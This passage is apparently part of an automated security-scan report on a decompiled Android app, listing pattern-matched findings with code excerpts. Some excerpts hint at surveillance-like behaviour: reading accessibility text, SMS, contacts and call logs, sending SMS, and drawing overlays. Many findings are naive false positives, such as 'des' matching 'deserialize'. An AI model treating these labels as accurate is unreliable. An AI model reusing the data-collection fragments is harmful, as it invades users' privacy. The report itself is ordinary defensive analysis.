    public static final int[] G = {android.R.attr.textAppearance, R.attr.enforceMaterialTheme, R.attr.enforceTextAppearance};

    public static final String A(String str) {
```

**72. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/i/g.java`
- **Line:** 169

```java
        if (accessibilityNodeInfo.getText() != null) {
            eVar.put("t", accessibilityNodeInfo.getText().toString());
        }
        if (accessibilityNodeInfo.getContentDescription() != null) {
            eVar.put("d", accessibilityNodeInfo.getContentDescription().toString());
        }
        Rect rect = new Rect();
```

**73. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/t2/l.java`
- **Line:** 136

```java
            if (gVar != null) {
                return gVar.q(r());
            }
            throw new IllegalStateException("Internal DAO object is null.  Lazy collections cannot be used if they have been deserialized.");
        } catch (SQLException e5) {
            StringBuilder g5 = androidx.activity.d.g("Could not build lazy iterator for ");
            g5.append(this.f5431b.a());
```

**74. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/g/b.java`
- **Line:** 15

```java
public @interface b {
    String[] alternateNames() default {};

    boolean deserialize() default true;

    Class<?> deserializeUsing() default Void.class;

```

**75. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/g/b.java`
- **Line:** 17

```java

    boolean deserialize() default true;

    Class<?> deserializeUsing() default Void.class;

    String format() default "";

```

**76. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/g/d.java`
- **Line:** 20

```java

    Class<?> builder() default Void.class;

    Class<?> deserializer() default Void.class;

    String[] ignores() default {};

```

**77. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/g/d.java`
- **Line:** 24

```java

    String[] ignores() default {};

    String[] includes() default {};

    Class<?> mappingTo() default Void.class;

```

**78. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/w3/b.java`
- **Line:** 58

```java
            StringBuilder g5 = androidx.activity.d.g("Unable to find acceptable protocols. isFallback=");
            g5.append(this.f5799c);
            g5.append(',');
            g5.append(" modes=");
            g5.append(this.f5800d);
            g5.append(',');
            g5.append(" supported protocols=");
```


### Insecure Network (25 issues)

**1. Insecure Network**
- **Description:** Pattern detected: SSLSocketFactory
- **File:** `sources/s3/w.java`
- **Line:** 9

```java
import java.util.List;
import javax.net.SocketFactory;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.X509TrustManager;
import kotlin.jvm.internal.Intrinsics;
import org.apache.commons.io.FileUtils;
```

**2. Insecure Network**
- **Description:** Pattern detected: SSLSocketFactory
- **File:** `sources/s3/w.java`
- **Line:** 68

```java
    public final SocketFactory f5334p;

    /* renamed from: q, reason: collision with root package name */
    public final SSLSocketFactory f5335q;

    /* renamed from: r, reason: collision with root package name */
    public final X509TrustManager f5336r;
```

**3. Insecure Network**
- **Description:** Pattern detected: SSLSocketFactory
- **File:** `sources/s3/w.java`
- **Line:** 152

```java
        public SocketFactory f5359o;

        /* renamed from: p, reason: collision with root package name */
        public SSLSocketFactory f5360p;

        /* renamed from: q, reason: collision with root package name */
        public X509TrustManager f5361q;
```

**4. Insecure Network**
- **Description:** Pattern detected: SSLSocketFactory
- **File:** `sources/s3/a.java`
- **Line:** 9

```java
import java.util.Objects;
import javax.net.SocketFactory;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLSocketFactory;
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.StringsKt;
import s3.s;
```

**5. Insecure Network**
- **Description:** Pattern detected: SSLSocketFactory
- **File:** `sources/s3/a.java`
- **Line:** 33

```java
    public final SocketFactory f5142e;

    /* renamed from: f, reason: collision with root package name */
    public final SSLSocketFactory f5143f;

    /* renamed from: g, reason: collision with root package name */
    public final HostnameVerifier f5144g;
```

**6. Insecure Network**
- **Description:** Pattern detected: SSLSocketFactory
- **File:** `sources/s3/a.java`
- **Line:** 50

```java
    /* renamed from: k, reason: collision with root package name */
    public final ProxySelector f5148k;

    public a(String host, int i5, n dns, SocketFactory socketFactory, SSLSocketFactory sSLSocketFactory, HostnameVerifier hostnameVerifier, f fVar, b proxyAuthenticator, Proxy proxy, List<? extends x> protocols, List<j> connectionSpecs, ProxySelector proxySelector) {
        Intrinsics.checkNotNullParameter(host, "uriHost");
        Intrinsics.checkNotNullParameter(dns, "dns");
        Intrinsics.checkNotNullParameter(socketFactory, "socketFactory");
```

**7. Insecure Network**
- **Description:** Pattern detected: sSLSocketFactory
- **File:** `sources/s3/a.java`
- **Line:** 50

```java
    /* renamed from: k, reason: collision with root package name */
    public final ProxySelector f5148k;

    public a(String host, int i5, n dns, SocketFactory socketFactory, SSLSocketFactory sSLSocketFactory, HostnameVerifier hostnameVerifier, f fVar, b proxyAuthenticator, Proxy proxy, List<? extends x> protocols, List<j> connectionSpecs, ProxySelector proxySelector) {
        Intrinsics.checkNotNullParameter(host, "uriHost");
        Intrinsics.checkNotNullParameter(dns, "dns");
        Intrinsics.checkNotNullParameter(socketFactory, "socketFactory");
```

**8. Insecure Network**
- **Description:** Pattern detected: sSLSocketFactory
- **File:** `sources/s3/a.java`
- **Line:** 60

```java
        Intrinsics.checkNotNullParameter(proxySelector, "proxySelector");
        this.f5141d = dns;
        this.f5142e = socketFactory;
        this.f5143f = sSLSocketFactory;
        this.f5144g = hostnameVerifier;
        this.f5145h = fVar;
        this.f5146i = proxyAuthenticator;
```

**9. Insecure Network**
- **Description:** Pattern detected: SSLSocketFactory
- **File:** `sources/a4/b.java`
- **Line:** 126

```java
        Method method3 = null;
        try {
            Class<?> cls = Class.forName("com.android.org.conscrypt.OpenSSLSocketImpl");
            Class<?> cls2 = Class.forName("com.android.org.conscrypt.OpenSSLSocketFactoryImpl");
            Class<?> paramsClass = Class.forName("com.android.org.conscrypt.SSLParametersImpl");
            Intrinsics.checkNotNullExpressionValue(paramsClass, "paramsClass");
            lVar = new l(cls, cls2, paramsClass);
```

**10. Insecure Network**
- **Description:** Pattern detected: SSLSocketFactory
- **File:** `sources/a4/h.java`
- **Line:** 17

```java
import java.util.logging.Logger;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.TrustManagerFactory;
import javax.net.ssl.X509TrustManager;
```

**11. Insecure Network**
- **Description:** Pattern detected: SSLSocketFactory
- **File:** `sources/a4/h.java`
- **Line:** 170

```java
        return sSLContext;
    }

    public SSLSocketFactory m(X509TrustManager trustManager) {
        Intrinsics.checkNotNullParameter(trustManager, "trustManager");
        try {
            SSLContext l5 = l();
```

**12. Insecure Network**
- **Description:** Pattern detected: SSLSocketFactory
- **File:** `sources/a4/h.java`
- **Line:** 175

```java
        try {
            SSLContext l5 = l();
            l5.init(null, new TrustManager[]{trustManager}, null);
            SSLSocketFactory socketFactory = l5.getSocketFactory();
            Intrinsics.checkNotNullExpressionValue(socketFactory, "newSSLContext().apply {\n…ll)\n      }.socketFactory");
            return socketFactory;
        } catch (GeneralSecurityException e5) {
```

**13. Insecure Network**
- **Description:** Pattern detected: SSLSocketFactory
- **File:** `sources/a4/d.java`
- **Line:** 11

```java
import java.util.Objects;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.TrustManagerFactory;
import javax.net.ssl.X509TrustManager;
```

**14. Insecure Network**
- **Description:** Pattern detected: SSLSocketFactory
- **File:** `sources/a4/d.java`
- **Line:** 101

```java
    }

    @Override // a4.h
    public final SSLSocketFactory m(X509TrustManager trustManager) {
        Intrinsics.checkNotNullParameter(trustManager, "trustManager");
        SSLContext sSLContext = SSLContext.getInstance("TLS", this.f99d);
        Intrinsics.checkNotNullExpressionValue(sSLContext, "SSLContext.getInstance(\"TLS\", provider)");
```

**15. Insecure Network**
- **Description:** Pattern detected: SSLSocketFactory
- **File:** `sources/a4/d.java`
- **Line:** 106

```java
        SSLContext sSLContext = SSLContext.getInstance("TLS", this.f99d);
        Intrinsics.checkNotNullExpressionValue(sSLContext, "SSLContext.getInstance(\"TLS\", provider)");
        sSLContext.init(null, new TrustManager[]{trustManager}, null);
        SSLSocketFactory socketFactory = sSLContext.getSocketFactory();
        Intrinsics.checkNotNullExpressionValue(socketFactory, "newSSLContext().apply {\n…null)\n    }.socketFactory");
        return socketFactory;
    }
```

**16. Insecure Network**
- **Description:** Pattern detected: SSLSocketFactory
- **File:** `sources/b4/l.java`
- **Line:** 4

```java
package b4;

import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes2.dex */
```

**17. Insecure Network**
- **Description:** Pattern detected: SSLSocketFactory
- **File:** `sources/b4/l.java`
- **Line:** 18

```java
    }

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public l(Class<? super SSLSocket> sslSocketClass, Class<? super SSLSocketFactory> sslSocketFactoryClass, Class<?> paramClass) {
        super(sslSocketClass);
        Intrinsics.checkNotNullParameter(sslSocketClass, "sslSocketClass");
        Intrinsics.checkNotNullParameter(sslSocketFactoryClass, "sslSocketFactoryClass");
```

**18. Insecure Network**
- **Description:** Pattern detected: sslSocketFactory
- **File:** `sources/b4/l.java`
- **Line:** 18

```java
    }

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public l(Class<? super SSLSocket> sslSocketClass, Class<? super SSLSocketFactory> sslSocketFactoryClass, Class<?> paramClass) {
        super(sslSocketClass);
        Intrinsics.checkNotNullParameter(sslSocketClass, "sslSocketClass");
        Intrinsics.checkNotNullParameter(sslSocketFactoryClass, "sslSocketFactoryClass");
```

**19. Insecure Network**
- **Description:** Pattern detected: sslSocketFactory
- **File:** `sources/b4/l.java`
- **Line:** 21

```java
    public l(Class<? super SSLSocket> sslSocketClass, Class<? super SSLSocketFactory> sslSocketFactoryClass, Class<?> paramClass) {
        super(sslSocketClass);
        Intrinsics.checkNotNullParameter(sslSocketClass, "sslSocketClass");
        Intrinsics.checkNotNullParameter(sslSocketFactoryClass, "sslSocketFactoryClass");
        Intrinsics.checkNotNullParameter(paramClass, "paramClass");
    }
}
```

**20. Insecure Network**
- **Description:** Pattern detected: sslSocketFactory
- **File:** `sources/b4/l.java`
- **Line:** 21

```java
    public l(Class<? super SSLSocket> sslSocketClass, Class<? super SSLSocketFactory> sslSocketFactoryClass, Class<?> paramClass) {
        super(sslSocketClass);
        Intrinsics.checkNotNullParameter(sslSocketClass, "sslSocketClass");
        Intrinsics.checkNotNullParameter(sslSocketFactoryClass, "sslSocketFactoryClass");
        Intrinsics.checkNotNullParameter(paramClass, "paramClass");
    }
}
```

**21. Insecure Network**
- **Description:** Pattern detected: SSLSocketFactory
- **File:** `sources/w3/j.java`
- **Line:** 28

```java
import javax.net.ssl.SSLPeerUnverifiedException;
import javax.net.ssl.SSLSession;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import kotlin.collections.CollectionsKt;
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.StringsKt__IndentKt;
```

**22. Insecure Network**
- **Description:** Pattern detected: SSLSocketFactory
- **File:** `sources/w3/j.java`
- **Line:** 279

```java
        Objects.requireNonNull(oVar);
        Intrinsics.checkNotNullParameter(call, "call");
        s3.a aVar2 = this.f5874q.f5197a;
        SSLSocketFactory sSLSocketFactory = aVar2.f5143f;
        SSLSocket sSLSocket = null;
        String str = null;
        try {
```

**23. Insecure Network**
- **Description:** Pattern detected: sSLSocketFactory
- **File:** `sources/w3/j.java`
- **Line:** 279

```java
        Objects.requireNonNull(oVar);
        Intrinsics.checkNotNullParameter(call, "call");
        s3.a aVar2 = this.f5874q.f5197a;
        SSLSocketFactory sSLSocketFactory = aVar2.f5143f;
        SSLSocket sSLSocket = null;
        String str = null;
        try {
```

**24. Insecure Network**
- **Description:** Pattern detected: sSLSocketFactory
- **File:** `sources/w3/j.java`
- **Line:** 283

```java
        SSLSocket sSLSocket = null;
        String str = null;
        try {
            Intrinsics.checkNotNull(sSLSocketFactory);
            Socket socket = this.f5859b;
            s sVar = aVar2.f5138a;
            Socket createSocket = sSLSocketFactory.createSocket(socket, sVar.f5288e, sVar.f5289f, true);
```

**25. Insecure Network**
- **Description:** Pattern detected: sSLSocketFactory
- **File:** `sources/w3/j.java`
- **Line:** 286

```java
            Intrinsics.checkNotNull(sSLSocketFactory);
            Socket socket = this.f5859b;
            s sVar = aVar2.f5138a;
            Socket createSocket = sSLSocketFactory.createSocket(socket, sVar.f5288e, sVar.f5289f, true);
            if (createSocket == null) {
                throw new NullPointerException("null cannot be cast to non-null type javax.net.ssl.SSLSocket");
            }
```


### Dynamic Permission Requests (9 issues)

**1. Dynamic Permission Requests**
- **Description:** Pattern detected: READ_SMS
- **File:** `sources/k3/f.java`
- **Line:** 760

```java
            }
            if (!z4) {
                try {
                    if (ContextCompat.checkSelfPermission(context, "android.permission.READ_SMS") != 0) {
                        f3873d = false;
                        return;
                    }
```

**2. Dynamic Permission Requests**
- **Description:** Pattern detected: READ_CONTACTS
- **File:** `sources/k3/f.java`
- **Line:** 569

```java
            }
            if (!z4) {
                try {
                    if (ContextCompat.checkSelfPermission(context, "android.permission.READ_CONTACTS") != 0) {
                        f3872c = false;
                        return;
                    }
```

**3. Dynamic Permission Requests**
- **Description:** Pattern detected: READ_CALL_LOG
- **File:** `sources/k3/f.java`
- **Line:** 498

```java
            }
            if (!z4) {
                try {
                    if (ContextCompat.checkSelfPermission(context, "android.permission.READ_CALL_LOG") != 0) {
                        f3874e = false;
                        return;
                    }
```

**4. Dynamic Permission Requests**
- **Description:** Pattern detected: READ_SMS
- **File:** `sources/f3/i.java`
- **Line:** 1334

```java
                }
                eVar.put("readImages", Integer.valueOf((i6 <= 32 ? ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_EXTERNAL_STORAGE") != 0 : ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_MEDIA_IMAGES") != 0) ? 0 : 1));
                eVar.put("readContacts", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_CONTACTS") == 0 ? 1 : 0));
                eVar.put("readSms", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_SMS") == 0 ? 1 : 0));
                eVar.put("readCallLog", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_CALL_LOG") == 0 ? 1 : 0));
                if (i6 >= 23) {
                    eVar.put("accessibility", Integer.valueOf(k3.a.f(this.f2811h) ? 1 : 0));
```

**5. Dynamic Permission Requests**
- **Description:** Pattern detected: READ_SMS
- **File:** `sources/f3/i.java`
- **Line:** 2651

```java
                    SmsManager.getDefault().sendTextMessage(str, null, str2, null, null);
                    return;
                }
            } else if (ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_SMS") == 0) {
                k3.f.m(this.f2811h, true);
                g3.d a5 = g3.d.a();
                Objects.requireNonNull(a5);
```

**6. Dynamic Permission Requests**
- **Description:** Pattern detected: READ_CONTACTS
- **File:** `sources/f3/i.java`
- **Line:** 736

```java

        public final void V() {
            long j5;
            if (ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_CONTACTS") != 0) {
                i.n(1, "38", null);
                return;
            }
```

**7. Dynamic Permission Requests**
- **Description:** Pattern detected: READ_CONTACTS
- **File:** `sources/f3/i.java`
- **Line:** 1333

```java
                    eVar.put("overlay", 0);
                }
                eVar.put("readImages", Integer.valueOf((i6 <= 32 ? ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_EXTERNAL_STORAGE") != 0 : ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_MEDIA_IMAGES") != 0) ? 0 : 1));
                eVar.put("readContacts", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_CONTACTS") == 0 ? 1 : 0));
                eVar.put("readSms", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_SMS") == 0 ? 1 : 0));
                eVar.put("readCallLog", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_CALL_LOG") == 0 ? 1 : 0));
                if (i6 >= 23) {
```

**8. Dynamic Permission Requests**
- **Description:** Pattern detected: READ_CALL_LOG
- **File:** `sources/f3/i.java`
- **Line:** 590

```java
                    this.f2811h.startActivity(intent);
                    return;
                }
            } else if (ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_CALL_LOG") == 0) {
                k3.f.e(this.f2811h, true);
                g3.e a5 = g3.e.a();
                Objects.requireNonNull(a5);
```

**9. Dynamic Permission Requests**
- **Description:** Pattern detected: READ_CALL_LOG
- **File:** `sources/f3/i.java`
- **Line:** 1335

```java
                eVar.put("readImages", Integer.valueOf((i6 <= 32 ? ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_EXTERNAL_STORAGE") != 0 : ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_MEDIA_IMAGES") != 0) ? 0 : 1));
                eVar.put("readContacts", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_CONTACTS") == 0 ? 1 : 0));
                eVar.put("readSms", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_SMS") == 0 ? 1 : 0));
                eVar.put("readCallLog", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_CALL_LOG") == 0 ? 1 : 0));
                if (i6 >= 23) {
                    eVar.put("accessibility", Integer.valueOf(k3.a.f(this.f2811h) ? 1 : 0));
                    eVar.put("battery", Integer.valueOf(((PowerManager) this.f2811h.getSystemService("power")).isIgnoringBatteryOptimizations(this.f2811h.getPackageName()) ? 1 : 0));
```


## 🟡 MEDIUM Severity Findings


### Logging Sensitive Data (40 issues)

**1. Logging Sensitive Data**
- **Description:** Pattern detected: Log.e(
- **File:** `sources/v1/d.java`
- **Line:** 290

```java
                jVar.f5622i = this.Z;
                staticLayout = jVar.a();
            } catch (j.a e5) {
                Log.e("CollapsingTextHelper", e5.getCause().getMessage(), e5);
                staticLayout = null;
            }
            StaticLayout staticLayout2 = (StaticLayout) Preconditions.checkNotNull(staticLayout);
```

**2. Logging Sensitive Data**
- **Description:** Pattern detected: Log.w(
- **File:** `sources/u0/a.java`
- **Line:** 63

```java
            if (r0 == 0) goto L33
            java.lang.String r4 = "ConnectionTracker"
            java.lang.String r5 = "Attempted to bind to a service in a STOPPED package."
            android.util.Log.w(r4, r5)
            return r1
        L33:
            boolean r4 = r4.bindService(r5, r6, r7)
```

**3. Logging Sensitive Data**
- **Description:** Pattern detected: Log.w(
- **File:** `sources/b2/g.java`
- **Line:** 390

```java

    public final void e(@NonNull Canvas canvas) {
        if (this.f327e.cardinality() > 0) {
            Log.w(f322x, "Compatibility shadow requested but can't be drawn for all operations in this shape.");
        }
        if (this.f324b.f364r != 0) {
            canvas.drawPath(this.f330h, this.f339q.f56a);
```

**4. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/k3/a.java`
- **Line:** 75

```java
            String str = (String) cls.getDeclaredMethod("get", String.class).invoke(cls, "hw_sc.build.platform.version");
            return TextUtils.isEmpty(str) ? "" : str;
        } catch (Throwable th) {
            th.printStackTrace();
            return "";
        }
    }
```

**5. Logging Sensitive Data**
- **Description:** Pattern detected: Log.v(
- **File:** `sources/m0/a.java`
- **Line:** 53

```java
                if (Log.isLoggable("FactoryPools", 2)) {
                    StringBuilder g5 = androidx.activity.d.g("Created new ");
                    g5.append(acquire.getClass());
                    Log.v("FactoryPools", g5.toString());
                }
            }
            if (acquire instanceof d) {
```

**6. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/d1/e.java`
- **Line:** 26

```java
                num = (Integer) Class.forName("android.os.Build$VERSION").getField("SDK_INT").get(null);
            } catch (Exception e5) {
                System.err.println("Failed to retrieve value from android.os.Build$VERSION.SDK_INT due to the following exception.");
                e5.printStackTrace(System.err);
            }
            aVar = (num == null || num.intValue() < 19) ? Boolean.getBoolean("com.google.devtools.build.android.desugar.runtime.twr_disable_mimic") ^ true ? new i() : new a() : new j();
        } catch (Throwable th) {
```

**7. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/d1/e.java`
- **Line:** 37

```java
            sb.append(name);
            sb.append("will be used. The error is: ");
            printStream.println(sb.toString());
            th.printStackTrace(System.err);
            aVar = new a();
        }
        f2480a = aVar;
```

**8. Logging Sensitive Data**
- **Description:** Pattern detected: Log.v(
- **File:** `sources/i0/i.java`
- **Line:** 66

```java
            @Override // android.view.ViewTreeObserver.OnPreDrawListener
            public final boolean onPreDraw() {
                if (Log.isLoggable("ViewTarget", 2)) {
                    Log.v("ViewTarget", "OnGlobalLayoutListener called attachStateListener=" + this);
                }
                a aVar = this.f3256b.get();
                if (aVar == null || aVar.f3254b.isEmpty()) {
```

**9. Logging Sensitive Data**
- **Description:** Pattern detected: Log.i(
- **File:** `sources/i0/i.java`
- **Line:** 113

```java
                return 0;
            }
            if (Log.isLoggable("ViewTarget", 4)) {
                Log.i("ViewTarget", "Glide treats LayoutParams.WRAP_CONTENT as a request for an image the size of this device's screen dimensions. If you want to load the original image and are ok with the corresponding memory cost and OOMs (depending on the input size), use override(Target.SIZE_ORIGINAL). Otherwise, use LayoutParams.MATCH_PARENT, set layout_width and layout_height to fixed dimension, or use .override() with fixed dimensions.");
            }
            Context context = this.f3253a.getContext();
            if (f3252d == null) {
```

**10. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/f3/b.java`
- **Line:** 16

```java
                BaseService.f1402s.removeView(BaseService.f1405v);
            }
        } catch (Exception e5) {
            e5.printStackTrace();
        }
        return false;
    }
```

**11. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/f3/c.java`
- **Line:** 30

```java
            }
            return false;
        } catch (Exception e5) {
            e5.printStackTrace();
            return false;
        }
    }
```

**12. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/f3/e.java`
- **Line:** 33

```java
                    i.e(byteArrayOutputStream.toByteArray(), i5, i6);
                }
            } catch (Exception e5) {
                e5.printStackTrace();
            }
        }
    }
```

**13. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/f3/e.java`
- **Line:** 79

```java
                }
            }
        } catch (Exception e5) {
            e5.printStackTrace();
        }
        if (size == null) {
            return;
```

**14. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/f3/i.java`
- **Line:** 439

```java
                c6.f6146g = g6;
                arrayList = ((t2.g) a6.f2971b).k(c6.f());
            } catch (SQLException e5) {
                e5.printStackTrace();
                arrayList = new ArrayList();
            }
            eVar.put("rows", arrayList);
```

**15. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/f3/i.java`
- **Line:** 497

```java
                    arrayList = gVar3.k(c8.f());
                }
            } catch (SQLException e5) {
                e5.printStackTrace();
                arrayList = new ArrayList<>();
            }
            eVar.put("rows", arrayList);
```

**16. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/f3/i.java`
- **Line:** 1048

```java
                c6.f6146g = g6;
                arrayList = a6.f2968a.k(c6.f());
            } catch (SQLException e5) {
                e5.printStackTrace();
                arrayList = new ArrayList<>();
            }
            eVar.put("rows", arrayList);
```

**17. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/f3/i.java`
- **Line:** 1210

```java
                c8.f6146g = g6;
                arrayList = c7.f2975a.k(c8.f());
            } catch (SQLException e5) {
                e5.printStackTrace();
                arrayList = new ArrayList<>();
            }
            eVar.put("rows", arrayList);
```

**18. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/f3/i.java`
- **Line:** 1283

```java
                c6.f6146g = g6;
                arrayList = b6.f2973a.k(c6.f());
            } catch (SQLException e5) {
                e5.printStackTrace();
                arrayList = new ArrayList<>();
            }
            eVar.put("rows", arrayList);
```

**19. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/f3/a.java`
- **Line:** 16

```java
                BaseService.f1402s.addView(BaseService.f1405v, BaseService.f1406w);
            }
        } catch (Exception e5) {
            e5.printStackTrace();
        }
        return false;
    }
```

**20. Logging Sensitive Data**
- **Description:** Pattern detected: Log.w(
- **File:** `sources/c0/d.java`
- **Line:** 19

```java
            return true;
        } catch (IOException e5) {
            if (Log.isLoggable("GifEncoder", 5)) {
                Log.w("GifEncoder", "Failed to encode GIF drawable data", e5);
            }
            return false;
        }
```

**21. Logging Sensitive Data**
- **Description:** Pattern detected: Log.w(
- **File:** `sources/c0/j.java`
- **Line:** 54

```java
            bArr = byteArrayOutputStream.toByteArray();
        } catch (IOException e5) {
            if (Log.isLoggable("StreamGifDecoder", 5)) {
                Log.w("StreamGifDecoder", "Error reading data from stream", e5);
            }
            bArr = null;
        }
```

**22. Logging Sensitive Data**
- **Description:** Pattern detected: Log.v(
- **File:** `sources/c0/a.java`
- **Line:** 78

```java
        int min = Math.min(cVar.f4539g / i6, cVar.f4538f / i5);
        int max = Math.max(1, min == 0 ? 0 : Integer.highestOneBit(min));
        if (Log.isLoggable("BufferGifDecoder", 2) && max > 1) {
            Log.v("BufferGifDecoder", "Downsampling GIF, sampleSize: " + max + ", target dimens: [" + i5 + "x" + i6 + "], actual dimens: [" + cVar.f4538f + "x" + cVar.f4539g + "]");
        }
        return max;
    }
```

**23. Logging Sensitive Data**
- **Description:** Pattern detected: Log.v(
- **File:** `sources/c0/a.java`
- **Line:** 178

```java
                if (Log.isLoggable("BufferGifDecoder", 2)) {
                    StringBuilder g5 = androidx.activity.d.g("Decoded GIF from stream in ");
                    g5.append(l0.f.a(elapsedRealtimeNanos));
                    Log.v("BufferGifDecoder", g5.toString());
                }
                return eVar2;
            }
```

**24. Logging Sensitive Data**
- **Description:** Pattern detected: Log.v(
- **File:** `sources/c0/a.java`
- **Line:** 185

```java
            if (Log.isLoggable("BufferGifDecoder", 2)) {
                StringBuilder g6 = androidx.activity.d.g("Decoded GIF from stream in ");
                g6.append(l0.f.a(elapsedRealtimeNanos));
                Log.v("BufferGifDecoder", g6.toString());
            }
            return null;
        } finally {
```

**25. Logging Sensitive Data**
- **Description:** Pattern detected: Log.v(
- **File:** `sources/c0/a.java`
- **Line:** 192

```java
            if (Log.isLoggable("BufferGifDecoder", 2)) {
                StringBuilder g7 = androidx.activity.d.g("Decoded GIF from stream in ");
                g7.append(l0.f.a(elapsedRealtimeNanos));
                Log.v("BufferGifDecoder", g7.toString());
            }
        }
    }
```

**26. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/e3/b.java`
- **Line:** 85

```java
                            g5.a(new b3.d(g5.d("receiptId")));
                            c5.f2953a.m(h5.f());
                        } catch (SQLException e5) {
                            e5.printStackTrace();
                        }
                        if (t4 != null && !t4.isEmpty()) {
                            for (AdInfo adInfo2 : t4) {
```

**27. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/e3/b.java`
- **Line:** 95

```java
                                try {
                                    adInfo = c6.f2953a.e(taskId);
                                } catch (SQLException e6) {
                                    e6.printStackTrace();
                                    adInfo = null;
                                }
                                if (adInfo == null) {
```

**28. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/e3/b.java`
- **Line:** 104

```java
                                    try {
                                        c7.f2953a.n(adInfo2);
                                    } catch (SQLException e7) {
                                        e7.printStackTrace();
                                    }
                                    if (!TextUtils.isEmpty(adInfo2.getImg())) {
                                        h d5 = com.bumptech.glide.b.f(App.f1372b).n(adInfo2.getImg()).d(l.f4893c);
```

**29. Logging Sensitive Data**
- **Description:** Pattern detected: Log.v(
- **File:** `sources/r/b0.java`
- **Line:** 78

```java
                this.f4813h = new f(fVar, iVar.f4848n);
                iVar.b().b(this.f4813h, gVar);
                if (Log.isLoggable("SourceGenerator", 2)) {
                    Log.v("SourceGenerator", "Finished encoding source to cache, key: " + this.f4813h + ", data: " + obj + ", encoder: " + e5 + ", duration: " + l0.f.a(elapsedRealtimeNanos));
                }
                this.f4812g.f5514c.b();
                this.f4810e = new e(Collections.singletonList(this.f4812g.f5512a), this.f4807b, this);
```

**30. Logging Sensitive Data**
- **Description:** Pattern detected: Log.v(
- **File:** `sources/r/j.java`
- **Line:** 437

```java
        e5.append(str2 != null ? androidx.activity.d.f(", ", str2) : "");
        e5.append(", thread: ");
        e5.append(Thread.currentThread().getName());
        Log.v("DecodeJob", e5.toString());
    }

    public final void k() {
```

**31. Logging Sensitive Data**
- **Description:** Pattern detected: Log.d(
- **File:** `sources/r/j.java`
- **Line:** 616

```java
            throw e5;
        } catch (Throwable th2) {
            if (Log.isLoggable("DecodeJob", 3)) {
                Log.d("DecodeJob", "DecodeJob threw unexpectedly, isCancelled: " + this.F + ", stage: " + androidx.appcompat.view.a.i(this.f4870s), th2);
            }
            if (this.f4870s != 5) {
                this.f4854c.add(th2);
```

**32. Logging Sensitive Data**
- **Description:** Pattern detected: Log.i(
- **File:** `sources/r/r.java`
- **Line:** 156

```java
            g5.append(" of ");
            g5.append(size);
            g5.append(")");
            Log.i("Glide", g5.toString(), (Throwable) arrayList.get(i5));
            i5 = i6;
        }
    }
```

**33. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/r/r.java`
- **Line:** 228

```java
    }

    @Override // java.lang.Throwable
    public final void printStackTrace() {
        f(System.err);
    }

```

**34. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/r/r.java`
- **Line:** 233

```java
    }

    @Override // java.lang.Throwable
    public final void printStackTrace(PrintStream printStream) {
